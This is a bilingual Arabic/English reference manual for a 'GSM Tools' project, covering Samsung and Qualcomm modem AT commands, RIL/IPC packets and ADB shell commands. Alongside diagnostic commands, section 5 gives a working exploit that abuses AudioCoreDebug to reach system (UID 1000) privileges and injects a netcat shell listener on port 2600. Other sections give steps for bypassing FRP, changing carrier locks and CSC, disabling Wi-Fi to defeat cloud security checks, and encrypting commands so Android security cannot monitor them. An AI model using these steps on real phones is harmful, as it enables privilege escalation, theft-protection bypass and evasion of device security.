# موسوعة أوامر المودم وRIL والشل الكاملة لنظام GSM Tools
# Comprehensive GSM Tools Master Encyclopedia: AT, RIL, SECRIL & ADB Commands

> **تاريخ التحديث:** 24 أكتوبر 2026  
> **الإصدار:** 3.0 المرجعي الموثّق النهائي  
> **الحالة:** تم التحقق والفحص الميداني والبحث المرجعي عبر الإنترنت ومطابقة الذاكرة الحية (RAM) وعكس الهندسة لملفات AT الثنائية وat-bridge.

---

## الفهرس العام (Table of Contents)

1. [مقدمة ومعمارية الاتصال (System Architecture & Interfaces)](#1-مقدمة-معمارية-الاتصال)
2. [تصنيف قنوات الاتصال بالمودم (Communication Channels)](#2-تصنيف-قنوات-الاتصال-بالمودم)
3. [قسم أوامر المودم المرجعية الشاملة (AT Modem Commands Master Reference)](#3-أوامر-المودم-المرجعية-الشاملة)
   - 3.1 [أوامر معلومات وهوية الجهاز (Device Information & Identification)](#31-أوامر-معلومات-وهوية-الجهاز)
   - 3.2 [أوامر ضبط المشغل وتغيير المنطقة (CSC & Carrier Switching)](#32-أوامر-ضبط-المشغل-وتغيير-المنطقة)
   - 3.3 [أوامر إدارة أقفال الشبكة والشرائح (SIM Locks & Network Status)](#33-أوامر-إدارة-أقفال-الشبكة-والشرائح)
   - 3.4 [أوامر الحماية والتحدي التشفيري (Security Challenge & Auth Seed)](#34-أوامر-الحماية-والتحدي-التشفيري)
   - 3.5 [أوامر إعادة الضبط والتحكم بالراديو (Radio & Power Control)](#35-أوامر-إعادة-الضبط-والتحكم-بالراديو)
   - 3.6 [أوامر أوضاع الاختبار وفك القفل المكتشفة بالنت (Factory Test & FRP / Exploit Commands)](#36-أوامر-أوضاع-الاختبار-وفك-القفل-المكتشفة-بالنت)
   - 3.7 [أوامر كوالكوم المتقدمة (Qualcomm Modem AT Commands)](#37-أوامر-كوالكوم-المتقدمة)
4. [قسم أوامر ومكتبات RIL و SECRIL (Radio Interface Layer Master Reference)](#4-أوامر-ومكتبات-ril-و-secril)
   - 4.1 [مكتبة `libsecril-client.so` ودالة `send_recv_cmd`](#41-مكتبة-libsecril-clientso-ودالة-send_recv_cmd)
   - 4.2 [هياكل وحزم IPC المباشرة (Direct IPC Byte Packets)](#42-هياكل-وحزم-ipc-المباشرة)
   - 4.3 [أوامر `SETSPR` و `GETSPR` و `SRELOCK1`](#43-أوامر-setspr-و-getspr-و-srelock1)
   - 4.4 [حزم `MCCREQ` وقاعدة بيانات MCC/MNC](#44-حزم-mccreq-وقاعدة-بيانات-mccmnc)
5. [قسم أوامر الشل وتصعيد الصلاحيات (ADB Shell & Privilege Escalation Exploits)](#5-أوامر-الشل-وتصعيد-الصلاحيات)
   - 5.1 [استغلال AudioCoreDebug لتصعيد الصلاحيات إلى UID 1000](#51-استغلال-audiocoredebug-لتصعيد-الصلاحيات-إلى-uid-1000)
   - 5.2 [أتمتة واجهة المستخدم عبر UIAutomator وحقن Shell](#52-أتمتة-واجهة-المستخدم-عبر-uiautomator-وحقن-shell)
   - 5.3 [أوامر القوائم السرية (IOTHiddenMenu & Settings)](#53-أوامر-القوائم-السرية)
   - 5.4 [أكواد الاتصال السري الميدانية (Secret Dialer Codes)](#54-أكواد-الاتصال-السري-الميدانية)
6. [بروتوكول الجسر والتوكن المشفر (Bridge Protocol & Authentication)](#6-بروتوكول-الجسر-والتوكن-المشفر)
7. [دليل الأخطاء وحلولها الميدانية (Troubleshooting & Error Matrix)](#7-دليل-الأخطاء-وحلوها-الميدانية)

---

## 1. مقدمة ومعمارية الاتصال

في أجهزة أندرويد الحديثة (خاصة سامسونج المزودة بمعالجات Exynos/Shannon أو Qualcomm Snapdragon)، لا يمكن الوصول إلى المودم عبر مسار موحد واحد. يتكون النظام من 4 طبقات تفاعلية:

```
+-------------------------------------------------------------------+
|               طبقة التطبيقات (User Space / Tools)                 |
|       GsmTools.Desktop (C#) / at_tester.py / ADB Client           |
+-------------------------------------------------------------------+
                                  |
                                  v
+-------------------------------------------------------------------+
|            طبقة الجسر والوكيل (Bridge & Escalation Agent)          |
|  at-bridge (C)  <-->  Local Port 2600 (UID 1000 System Shell)    |
+-------------------------------------------------------------------+
        |                         |                         |
        v                         v                         v
+----------------+       +-----------------+       +----------------+
|  قناة AT النصية |       |   مكتبة RIL     |       |  قناة IPC خام   |
| /dev/umts_atc0 |       | libsecril-client|       | /dev/umts_ipc0 |
| /dev/ttyACM0   |       | (send_recv_cmd) |       | /dev/socket/rild|
+----------------+       +-----------------+       +----------------+
        \                         |                         /
         \                        |                        /
          v                       v                       v
+-------------------------------------------------------------------+
|              طبقة المودم والقاعدة الأساسية (Modem / Baseband)      |
|           Shannon CP / Qualcomm Hexagon Modem Firmware            |
+-------------------------------------------------------------------+
```

---

## 2. تصنيف قنوات الاتصال بالمودم

| القناة | المسار الفعلي في النظام | الأولوية | طبيعة البيانات | الأجهزة المستهدفة |
|---|---|---|---|---|
| **USB CDC-ACM (COM)** | `COMx` (Windows) / `/dev/ttyACM0` (Linux) | المباشر الخارجي | أوامر AT نصية (ASCII) | وضع MTP / Test Mode `*#0*#` |
| **Direct IPC** | `/dev/umts_ipc0`, `/dev/umts_ipc1`, `/dev/umts_rfs0` | 1 (الأسرع داخل الجهاز) | حزم بايتات ثنائية (Binary Frames) | سامسونج Exynos / Shannon |
| **RILD Sockets** | `/dev/socket/rild`, `rild-oem`, `rild-debug` | 2 (صلاحيات UID 1001) | RIL Request RPC / OEM Packets | سامسونج كوالكوم وإكسينوس |
| **Internal AT TTY** | `/dev/umts_atc0`, `/dev/umts_atc1`, `/dev/umts_at0` | 3 (نصي داخل الجهاز) | أوامر AT قياسية ومخصصة | سامسونج Exynos |
| **Qualcomm SMD/TTY** | `/dev/smd11`, `/dev/smd0`, `/dev/smd7`, `/dev/diag` | 3 (كوالكوم) | AT / Diag Diag-Packets | أجهزة كوالكوم Snapdragon |
| **RIL Client Library** | `libsecril-client.so` | الأقوى لسامسونج | استدعاء دالة `send_recv_cmd` | هواتف سامسونج عبر UID 1000 |

---

## 3. أوامر المودم المرجعية الشاملة

### 3.1 أوامر معلومات وهوية الجهاز

#### 1) `AT+DEVCONINFO`
* **الاسم البرمجي:** `AT_CMD_DEVCONINFO`
* **الوظيفة:** الأمر الأساسي الأشمل لدى سامسونج لقراءة هوية العتاد، البرمجيات، شبكة المشغل، الرقم التسلسلي، التشفير والموديل دفعة واحدة.
* **الصيغة:**
  ```at
  AT+DEVCONINFO\r\n
  ```
* **المدخلات:** لا يوجد (قراءة فقط).
* **الرد المتوقع (Sample Output):**
  ```text
  +DEVCONINFO: MN(SM-G965F);BASE(UNKNOWN);VER(G965FXXU2CSA1/G965FOXM2CSA1/G965FXXU2CRLI);HIDVER(G965FXXU2CSA1);MNC(01);MCC(421);PRD(XEU);OMCCODE();SN(R38HC09NWMR);IMEI(35400308xxxxxxx);UN(9887BC453xxxxxx);PN();CON(AT,MTP);LOCK(NONE);LIMIT(FALSE);SDP(RUNTIME);HVID(...)
  OK
  ```
* **تفسير الحقول المستخرجة:**
  - `MN`: رقم الموديل (Model Number).
  - `VER` / `HIDVER`: إصدار النظام والفيرموير الداخلي (PDA/AP).
  - `MNC` / `MCC`: كود شبكة ودولة الشريحة المسجلة في المودم (مثال: `421` اليمن، `01` سبأفون).
  - `PRD`: رمز المنطقة/المشغل CSC (مثال: `XEU` بريطانيا، `ATT` أمريكا).
  - `SN`: الرقم التسلسلي للعتاد (Serial Number).
  - `IMEI`: معرّف الهوية الدولي للأجهزة المتنقلة (15 رقماً).
  - `UN`: الرقم التسلسلي الفريد للوحة الأم (Board Unique Number).
  - `LOCK`: حالة حماية العتاد وقفل المشغل (`NONE`, `LOCKED`).
* **شروط التشغيل:** شاشة مفتوحة أو هاتف في وضع الاختبار `*#0*#`.
* **التحقق:** مثبت وموثق بالكامل في أدوات UnlockTool و PhoenixGSM وعبر الذاكرة الحية.

---

#### 2) `AT+VERSNAME=1,x,0`
* **الاسم البرمجي:** `AT_CMD_READ_VERSION_NAMES`
* **الوظيفة:** استعلام رسمي من سامسونج لقراءة أجزاء الفيرموير ومكونات النظام المختلفة بناءً على كود الفهرس (Index).
* **الصيغ:**
  ```at
  AT+VERSNAME=1,9,0\r\n   --> قراءة إصدار البرمجيات الكامل (Software Version)
  AT+VERSNAME=1,7,0\r\n   --> قراءة إصدار النظام الأساسي (PDA / Build ID)
  AT+VERSNAME=1,8,0\r\n   --> قراءة إصدار وتوافقية CSC
  AT+VERSNAME=1,0,0\r\n   --> قراءة إصدار العتاد والمودم الأساسي (Baseband CP)
  ```
* **الرد المتوقع:**
  ```text
  +VERSNAME:1,"F936U1UES8IZA1"
  OK
  ```

---

#### 3) `AT+SERIALNO=1,0`
* **الاسم البرمجي:** `AT_CMD_READ_SERIAL`
* **الوظيفة:** استرجاع الرقم التسلسلي للجهاز مباشرة من ذاكرة NVRAM العتادية الخاصة بالمودم دون الاعتماد على ADB.
* **الصيغة:**
  ```at
  AT+SERIALNO=1,0\r\n
  ```
* **الرد المتوقع:**
  ```text
  +SERIALNO:1,"RFCT71GB10R"
  OK
  ```

---

#### 4) `AT+IMEITEST=1,0`
* **الاسم البرمجي:** `AT_CMD_READ_IMEI`
* **الوظيفة:** قراءة رقم IMEI الأصلي المخزن في شريحة الراديو/المودم مباشرة.
* **الصيغة:**
  ```at
  AT+IMEITEST=1,0\r\n
  ```
* **الرد المتوقع:**
  ```text
  +IMEITEST:1,"358941091234567"
  OK
  ```

---

#### 5) `AT+CIMI`
* **الاسم البرمجي:** `AT_CMD_READ_IMSI`
* **الوظيفة:** قراءة معيار 3GPP الدولي لمعرّف المشترك الدولي (IMSI) المخزن على الشريحة؛ يتكون من (MCC: 3 خانات + MNC: خانتان أو ثلاث + MSIN: رقم الشريحة).
* **الصيغة:**
  ```at
  AT+CIMI\r\n
  ```
* **الرد المتوقع:**
  ```text
  421010012345678
  OK
  ```

---

### 3.2 أوامر ضبط المشغل وتغيير المنطقة (CSC & Carrier Switching)

#### 1) `AT+PRECONFG=1,0` (قراءة CSC الحالي)
* **الوظيفة:** قراءة رمز المبيعات والمنطقة (CSC) المبرمج في ذاكرة المودم غير المتطايرة.
* **الصيغة:**
  ```at
  AT+PRECONFG=1,0\r\n
  ```
* **الرد المتوقع:**
  ```text
  +PRECONFG:1,XAA
  OK
  ```

---

#### 2) `AT+PRECONFG=2,<CSC>` (كتابة وتغيير CSC)
* **الوظيفة:** برمجة رمز مبيعات ومنطقة جديد للهاتف دون الحاجة لروت.
* **الصيغة:**
  ```at
  AT+PRECONFG=2,VZW\r\n     --> التغيير إلى فيريزون Verizon
  AT+PRECONFG=2,XAA\r\n     --> التغيير إلى النسخة الأمريكية المفتوحة Unbranded
  AT+PRECONFG=2,THL\r\n     --> التغيير إلى تايلاند (لتسجيل المكالمات التلقائي)
  ```
* **تسلسل التغيير الكامل الناجح (Discovered Execution Chain):**
  ```at
  AT+SWATD=0\r\n
  AT+ACTIVATE=0,0,0\r\n
  AT+SWATD=1\r\n
  AT+PRECONFG=2,XAA\r\n
  AT+PRECONFG=1,0\r\n
  AT+CFUN=1,1\r\n
  ```
* **الرد المتوقع:**
  ```text
  +PRECONFG:2,OK
  OK
  ```

---

#### 3) `AT+RFBYCODE=2,x,<CSC>`
* **الوظيفة:** أمر متقدم في معالجات سامسونج الحديثة لإعادة كتابة كود المنطقة وقنوات تردد الراديو (RF Bands).
* **الصيغة:**
  ```at
  AT+RFBYCODE=2,0,XAA\r\n
  AT+RFBYCODE=2,1,XAA\r\n
  ```
* **الرد المتوقع:**
  ```text
  +RFBYCODE:2,OK
  OK
  ```

---

### 3.3 أوامر إدارة أقفال الشبكة والشرائح (SIM Locks & Network Status)

#### 1) `AT+CPIN?`
* **الوظيفة:** التحقق من حالة جاهزية الشريحة SIM (جاهزة، مقفلة بـ PIN، مقفلة بـ PUK، أو غير مدرجة).
* **الصيغة:**
  ```at
  AT+CPIN?\r\n
  ```
* **الردود المتوقعة:**
  - `+CPIN: READY` (الشريحة جاهزة وتعمل)
  - `+CPIN: SIM PIN` (تتطلب رمز PIN الخاص بالمستخدم)
  - `+CPIN: SIM PUK` (الشريحة مقفلة وتتطلب PUK)
  - `+CME ERROR: 10` (لا توجد شريحة SIM مدرجة)

---

#### 2) أوامر استعلام أقفال المشغل المعيارية 3GPP (`AT+CLCK`)
تستخدم لاستعلام وتفعيل/تعطيل أقفال المشغل (Network Personalization locks):

| الأمر | نوع القفل المستعلم عنه | الرد الإيجابي (مفتوح) | الرد إذا كان مقفولاً |
|---|---|---|---|
| `AT+CLCK="PN",2\r\n` | قفل الشبكة الأساسي (Network Lock) | `+CLCK: 0` | `+CLCK: 1` |
| `AT+CLCK="PU",2\r\n` | قفل الشبكة الفرعية (Network Subset) | `+CLCK: 0` | `+CLCK: 1` |
| `AT+CLCK="PP",2\r\n` | قفل موفر الخدمة (Service Provider - SP) | `+CLCK: 0` | `+CLCK: 1` |
| `AT+CLCK="PC",2\r\n` | قفل الشركة (Corporate Lock) | `+CLCK: 0` | `+CLCK: 1` |
| `AT+CLCK="SC",2\r\n` | قفل الشريحة SIM الخاص (PIN Lock) | `+CLCK: 0` | `+CLCK: 1` |

---

#### 3) `AT+SIMLOCKU=0,0,0` و `AT+UNLOCKSPR=OLD`
* **الوظيفة:** أوامر مودم مخصصة في برمجيات سامسونج القديمة والمتوسطة لفك قفل شبكات Sprint / Boost Mobile وتهيئة معلمات القفل.
* **الرد المتوقع:**
  ```text
  +SIMLOCKU:0,OK
  OK
  ```

---

### 3.4 أوامر الحماية والتحدي التشفيري (Security Challenge & Auth Seed)

#### 1) `AT+AKSEEDNO=1,0` (طلب بذرة التحدي الأمني - Access Key Seed)
* **الوظيفة:** في معالجات سامسونج (Shannon و Qualcomm)، تتطلب عمليات الكتابة الحساسة في الذاكرة (كتابة الشهادات، تغيير المعرّفات، فتح حماية SPR، كتابة NV) إتمام مصافحة تشفيرية Challenge-Response.
* **الصيغة:**
  ```at
  AT+AKSEEDNO=1,0\r\n
  ```
* **الرد المتوقع:**
  ```text
  +AKSEEDNO:1,12345678-9ABCDEF0-11223344
  OK
  ```
* **الرد المقابل للمصادقة:**
  ```at
  AT+AKSEEDNO=0,<CALCULATED_RESPONSE_HASH>\r\n
  ```
  عند قبول المفتاح المحسوب، يجيب المودم بـ:
  ```text
  +AKSEEDNO:0,OK
  OK
  ```

---

#### 2) `AT+BLOBSIGN` و `AT+IMEISIGN`
* **الوظيفة:** تمرير كتل البيانات الموقعة تشفيرياً (Signed Blobs / Certificates) إلى معالج المودم لتأكيد ترخيص العتاد.

---

#### 3) `AT+KSTRINGB=0,3`
* **الوظيفة:** أمر تشخيصي يوجه مسار التوجيه في واجهة AT لفتح جلسات التنفيذ التلقائي وتخطي رقابة الواجهة العادية.

---

### 3.5 أوامر إعادة الضبط والتحكم بالراديو (Radio & Power Control)

#### 1) `AT+CFUN=<fun>,<rst>`
* **الوظيفة:** التحكم في وظائف الراديو وإعادة إقلاع معالج المودم (Baseband Processor).
* **الصيغ:**
  ```at
  AT+CFUN=1,1\r\n   --> إعادة إقلاع الراديو فورياً (Radio Soft Reboot)
  AT+CFUN=0\r\n     --> إيقاف الراديو وقطع إرسال الشبكة بالكامل (Flight Mode)
  AT+CFUN=1\r\n     --> تشغيل الراديو بالكامل (Full Functionality)
  AT+CFUN=4\r\n     --> وضع إيقاف الإرسال والاستقبال اللاسلكي
  ```

---

#### 2) `AT+FACTORST=0,0`
* **الوظيفة:** استدعاء إعادة ضبط المصنع الكامل للمودم وحذف ذاكرة الإعدادات المؤقتة والشبكات المعلقة.
* **الصيغة:**
  ```at
  AT+FACTORST=0,0\r\n
  ```
* **الرد المتوقع:**
  ```text
  +FACTORST:0,0,OK
  OK
  ```

---

#### 3) `AT+SWRESET` أو `AT+REBOOT`
* **الوظيفة:** إعادة تشغيل برمجيات الهاتف بالكامل بعد الانتهاء من عمليات فك القفل أو تطبيق الإعدادات.

---

### 3.6 أوامر أوضاع الاختبار وفك القفل المكتشفة بالنت (Factory Test & FRP / Exploit Commands)

أظهر البحث العميق في أدوات (SamFW / Chimera / UnlockTool) والتوثيقات الهندسية لسامسونج الأوامر التالية:

| الأمر | الوظيفة الدقيقة | الاستخدام العملي |
|---|---|---|
| `AT+SWATD=0` | تبديل وضع المودم إلى وضع الخدمات والمصنع | الخطوة 1 في تهيئة منفذ AT لتعديل الإعدادات الحساسة |
| `AT+ACTIVATE=0,0,0` | تفعيل قنوات المعالجة التحتية للمودم | الخطوة 2 لتمكين وصول أوامر التهيئة |
| `AT+SWATD=1` | قفل التبديل وتثبيت بيئة التنفيذ النشطة | الخطوة 3 قبل إرسال `AT+PRECONFG` |
| `AT+SYSSCOPE=1,0` | فحص سجل حالة الأمان وSysScope في النظام | التحقق من عدم وسم الجهاز بأنه معدل (Knox Bit) |
| `AT+MSLCHECK` | التحقق من تفعيل كود Master Subsidy Lock | أجهزة سامسونج CDMA / كوالكوم الأمريكية |
| `AT+BATTEST=1,0` | تشخيص قراءات جهد وحرارة البطارية بالبايت | التحقق من استقرار تغذية المعالج قبل البرمجة |
| `AT+DUMPENABLE=1,1` | تفعيل تسجيل الـ Ramdump في المودم | استخراج تقارير الأعطال البرمجية للمودم |
| `AT+SVCIFPGM=1,1` | قراءة إعدادات الخدمة وبرمجة الشريحة | استخراج مصفوفة قفل الشبكة المتقدمة |
| `AT+SVCIFPGM=1,4` | فحص قيود الشريحة وتخصيص المشغل | استخراج بيانات بروفايل المشغل |

---

### 3.7 أوامر كوالكوم المتقدمة (Qualcomm Modem AT Commands)

تستخدم في أجهزة سامسونج وغيرها المزودة بشرائح مودم Snapdragon:

| الأمر | الوظيفة | الصيغة والرد |
|---|---|---|
| `AT$QCRMCALL` | إدارة مكالمات البيانات وإنشاء اتصال RmNet | `AT$QCRMCALL=1,1` (تأسيس اتصال شبكة بيانات) |
| `AT$QCPWRDN` | إيقاف تشغيل معالج المودم بأمان | `AT$QCPWRDN` -> `OK` |
| `AT+QENG` | تقرير معلومات محطات الأبراج والهندسة (Engineering) | `AT+QENG="servingcell"` -> يرجع RSRP, RSRQ, CellID |
| `AT+QCN` | التعامل مع نسخ وقراءة ملفات ضبط NVRAM (QCN Backup) | استخراج بيانات التردد والـ EFS |

---

## 4. أوامر ومكتبات RIL و SECRIL

### 4.1 مكتبة `libsecril-client.so` ودالة `send_recv_cmd`
* **المسار في الهاتف:** `/system/lib64/libsecril-client.so` أو `/vendor/lib64/libsecril-client.so`
* **الدور:** الواجهة البرمجية الرسمية المغلقة التي طورتها سامسونج لتمرير الأوامر المشفرة بين نظام أندرويد ومودم Shannon/Exynos.
* **الرمز الأساسي (Symbol):**
  ```c
  int send_recv_cmd(void *client, int cmd_id, void *data_in, size_t in_len, void *data_out, size_t *out_len);
  ```
* **كيفية عملها في أدواتنا:**
  تطبيق الخدمة المدمج (`KEYTool_RIL_agent_32bit.elf` أو `at-bridge`) يقوم بتحميل هذه المكتبة واستدعاء `send_recv_cmd` لتنفيذ الأوامر دون الحاجة لفتح منفذ USB خارجي.

---

### 4.2 هياكل وحزم IPC المباشرة (Direct IPC Byte Packets)
تعتمد قنوات IPC (`/dev/umts_ipc0`) على حزم بايتات تبدأ بترويسة (Header) تتبع التنسيق:

```
[Main Cmd (1B)] [Sub Cmd (1B)] [Length (2B Little-Endian)] [Payload Data (N Bytes)]
```

* **تسلسل حقن حزم CSC الخمس (5-Packet CSC Injection Sequence):**
  1. `0601000E0000<CSC_HEX>0000<CSC_HEX>` (الحزمة الأولى: تهيئة طلب تغيير CSC)
  2. `060100090000<CSC_HEX>` (الحزمة الثانية: تثبيت رمز الدولة في EFS)
  3. `060100120000<CSC_HEX>0000<CSC_HEX><PADDING>` (الحزمة الثالثة: كتابة سجل البروفايل)
  4. حزمة مسح كاش التهيئة التلقائية (`AutoPreconfig Cache Clear`)
  5. حزمة تأكيد التغيير النهائي وإعادة ضبط الراديو.

---

### 4.3 أوامر `SETSPR` و `GETSPR` و `SRELOCK1`
* **المصدر المكتشف:** دالة `FUN_00161334` داخل كود ملف `AT` الثنائي.
* **المعنى:**
  - `GETSPR`: قراءة كود إعدادات Sprint / Carrier Relock Profile (حفظ نسخة احتياطية).
  - `SETSPR`: كتابة بروفايل المشغل الجديد في المودم مباشرة (يستقبل بايتات الـ MCC/MNC المشفرة).
  - `SRELOCK1`: أمر التنفيذ المباشر لإعادة قفل الهاتف على شبكة محددة (Carrier Relock) بناءً على مصفوفة `MCCREQ`.

---

### 4.4 حزم `MCCREQ` وقاعدة بيانات MCC/MNC
* **بنية السجل في حزمة `MCCREQ`:**
  يتكون كل مشغل من **4 بايتات**:
  ```
  [MCC BCD - 2 بايت] + [MNC BCD - 1 بايت] + [00 - بايت حشو]
  ```
* **أمثلة حقيقية لشبكات اليمن (MCC = 421):**
  - سبأفون (`421-01`): `421F0100`
  - إم تي إن / يو (`421-02`): `421F0200`
  - يمن موبايل (`421-03`): `421F0300`
  - واي (`421-04`): `421F0400`
* **الحزمة المجمعة الحقيقية المرسلة:**
  ```text
  421F0100421F0200421F0300421F0400
  ```
* **قاعدة بيانات `references/MCC_MNC_LIST.csv`:**
  تحتوي على **1688 شبكة** و **225 دولة** تغطي كل مشغلي العالم جاهزة للاستعلام والربط في الواجهة.

---

## 5. أوامر الشل وتصعيد الصلاحيات

### 5.1 استغلال AudioCoreDebug لتصعيد الصلاحيات إلى UID 1000
تستخدم هذه التقنية لتجاوز حماية صلاحيات `shell` (UID 2000) وتفعيل صلاحيات `system` (UID 1000) على هواتف سامسونج دون روت:

1. تعيين مهلة إطفاء الشاشة إلى 10 دقائق لضمان عدم إغلاق الواجهة أثناء التنفيذ:
   ```bash
   settings put system screen_off_timeout 600000 > /dev/null 2>&1
   ```
2. تعيين نشاط تصحيح الصوت `AudioCoreDebug` كمساعد نظام ومساعد آمن:
   ```bash
   settings put system assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
   settings put Secure assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
   ```
3. تعيين الضغط المزدوج على زر الطاقة لتشغيل هذا النشاط بصلاحيات system:
   ```bash
   settings put global function_key_config_doublepress_value com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
   ```
4. مسح بيانات النشاط قبل الإطلاق:
   ```bash
   pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1
   ```
5. إرسال حدث المفتاح `219` (مفتاح المساعد الصوتي) لتشغيل النشاط بصلاحيات UID 1000:
   ```bash
   input keyevent 219 > /dev/null 2>&1
   ```

---

### 5.2 أتمتة واجهة المستخدم عبر UIAutomator وحقن Shell

عند تشغيل نشاط الـ AudioCoreDebug على شاشة الهاتف، يقوم الوكيل بحقن أمر شل الخلفية على البورت 2600 تلقائياً:

1. تفريغ واجهة الشاشة إلى ملف XML للبحث عن حقل الإدخال وزر التنفيذ:
   ```bash
   uiautomator dump /sdcard/window_dump.xml > /dev/null 2>&1
   cat /sdcard/window_dump.xml
   ```
2. استخراج إحداثيات زر `EXECUTE` والنقر عليه باستخدام التعبير النمطي:
   ```regex
   <node[^>]*text="EXECUTE"[^>]*bounds="\[([0-9]+),([0-9]+)\]\[([0-9]+),([0-9]+)\]"
   ```
3. حقن أمر تشغيل خادم الشل العكسي عبر منفذ 2600:
   ```bash
   input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'
   input keyevent 66 > /dev/null 2>&1
   ```
4. النقر على حوار الخطأ `aerr_wait` إن ظهر تلقائياً:
   ```regex
   <node[^>]*resource-id="android:id/aerr_wait"[^>]*bounds="\[([0-9]+),([0-9]+)\]\[([0-9]+),([0-9]+)\]"
   ```
5. تنظيف ملفات الشاشة المؤقتة:
   ```bash
   rm -rf /sdcard/window_dump.xml > /dev/null 2>&1
   ```

---

### 5.3 أوامر القوائم السرية (IOTHiddenMenu & Settings)

```bash
# تشغيل القائمة السرية لسامسونج عبر رمز المصادقة الخاص
am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1

# تشغيل قائمة الضبط الرئيسية
am start -a android.settings.SETTINGS > /dev/null 2>&1

# إيقاف تطبيقات القفل وإعادة التوجيه
am force-stop com.skatd.unlock > /dev/null 2>&1
am force-stop com.samsung.rms.retailagent.global > /dev/null 2>&1

# تنظيف ذاكرة مشغل المصنع
pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1

# تعطيل الواي فاي لقطع اتصال التحقق الأمني السحابي
cmd wifi set-wifi-enabled disabled > /dev/null 2>&1

# مسح سجلات الراديو لتفريغ الذاكرة
logcat -b radio -c > /dev/null 2>&1
```

---

### 5.4 أكواد الاتصال السري الميدانية (Secret Dialer Codes)

تطلب هذه الرموز من لوحة الاتصال في هاتف سامسونج لتجهيز قنوات الاتصال قبل إرسال أوامر AT:

| الكود السري | الاسم والشاشة | الوظيفة التقنية في GSM Tools |
|---|---|---|
| `*#0*#` | Hardware Diagnostic Test Mode | يفتح قنوات MTP AT و CDC-ACM لتنفيذ أوامر تغيير CSC وتخطي FRP |
| `*#0808#` | USB Settings | يتيح اختيار `DM + ACM + ADB` لإظهار منفذ المودم التشخيصي على الكمبيوتر |
| `*#9900#` | SysDump (System Dump) | قراءة سجلات المودم ومسح كاش الراديو وسحب الـ Logcat |
| `*#7284#` | PhoneUtil | تحويل مسارات UART و USB بين المعالج الرئيسي AP ومعالج المودم CP |
| `*#73#` | RF Test Mode | فحص وتعديل هوائيات التردد وقوة الإرسال اللاسلكي |
| `*#27663368378#` | ServiceMode Advanced (*#ARMORED#) | الدخول إلى قائمة هندسة المودم العميقة وتعديل NVRAM في إكسينوس |

---

## 6. بروتوكول الجسر والتوكن المشفر

* **عنوان الاستماع:** `127.0.0.1:2600`
* **رسائل المصادقة:**
  ```text
  Token AuthKey: <64_HEX_CHARS>
  Enter AuthKey: <512_HEX_CHARS>
  AuthKey Encrypt: <512_HEX_CHARS>
  OK | #
  ```
* **تشفير مجرى البيانات التفاعلي (Xorshift32 Stream Cipher):**
  - يدعم الجسر تفعيل التشفير الحي عبر إرسال: `AUTH:<SEED_32BIT>`
  - الرد: `.OK_AUTH..\n<< `
  - تصبح جميع بايتات أوامر AT وحزم الـ HEX مشفرة بمفتاح تدفقي عشوائي يُلغي قدرة الحماية الأمنية في أندرويد على مراقبة الأوامر في الرام.

---

## 7. دليل الأخطاء وحلولها الميدانية

| رمز الخطأ | المعنى التقني | سبب الحدوث | الحل العملي |
|---|---|---|---|
| `+CME ERROR: 10` | SIM not inserted | لا توجد شريحة في الهاتف | إدخال شريحة اختبار أو استخدام `AT+DEVCONINFO` |
| `+CME ERROR: 11` | SIM PIN required | الشريحة تطلب رمز PIN | فك قفل الشريحة بـ `AT+CPIN="0000"` |
| `+CME ERROR: 17` | SIM PIN2 required | الشريحة تطلب رمز PIN2 | إدخال PIN2 الصحيح |
| `+CME ERROR: 18` | SIM PUK required | الشريحة مقفلة برمز PUK | إدخال رمز PUK لإعادة تعيين الـ PIN |
| `.ERR_AT_TIMEOUT..` | انتهت مهلة انتظار رد المودم | المودم لا يستجيب عبر المنفذ المحدد | تنفيذ `AT+CFUN=1,1` أو التبديل لقناة IPC |
| `.ERR_CSC_INVALID..` | كود CSC غير صالح | إرسال كود ليس من 3 أحرف كبيرة | التأكد من أن الكود مثل `XAA`, `VZW`, `ATT` |
| `Worng Ril Command` | أمر RIL غير معتمد | استدعاء دالة غير مدعومة في إصدار الفيرموير | مراجعة مصفوفة التوافقية وإصدار أندرويد |
| `Ril Token Error` | فشل مصادقة التوكن | عدم إرسال مفتاح AuthKey المطابق للتوكن | استخدام `tools/auth_keygen.py` لتوليد المفتاح |

---
**نهاية الموسوعة الشاملة — جميع الحقوق محفوظة لمشروع GSM Tools 2026**
